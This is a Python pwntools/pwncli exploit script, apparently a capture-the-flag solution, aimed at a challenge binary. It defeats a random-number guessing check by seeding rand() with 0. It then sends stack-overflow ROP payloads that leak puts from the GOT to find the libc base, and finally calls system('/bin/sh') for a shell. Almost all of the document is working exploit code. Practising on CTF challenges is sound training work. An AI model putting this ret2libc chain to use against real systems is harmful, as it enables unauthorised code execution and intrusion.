#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from pwncli import *
cli_script()
set_remote_libc('./libc-2.31.so')

io: tube = gift.io
elf: ELF = gift.elf
libc1: ELF = gift.libc

i2b = lambda c : str(c).encode()
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
debugB = lambda : input("\033[1m\033[33m[ATTACH ME]\033[0m")

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)

import ctypes
libc = ctypes.CDLL("./libc-2.31.so")
libc.srand(0)
ru(b'Please enter your name:\n')
s(b"/bin/sh\x00".ljust(0x12, b"\x00"))
for i in range(100):
    ru(b"Guess the random number:\n")
    s(p32(libc.rand() % 100 + 1))
ru(b"You are talented, here's your gift!\n")
payload = b"a"*0x30 + b"a"*8
pop_rdi_ret = 0x0000000000401443
pop_rsi_r15_ret = 0x0000000000401441
payload += p64(pop_rdi_ret) + p64(elf.got["puts"])
payload += p64(elf.plt["puts"])
payload += p64(0x40125D)
s(payload)
libc_base = u64_ex(rn(6)) - libc1.sym.puts
lg("libc_base")

payload = b"a"*0x30 + b"a"*8
payload += p64(pop_rdi_ret + 1)
payload += p64(pop_rdi_ret) + p64(next(libc1.search(b"/bin/sh\x00")) + libc_base)
payload += p64(libc_base + libc1.sym.system)
s(payload)



ia()
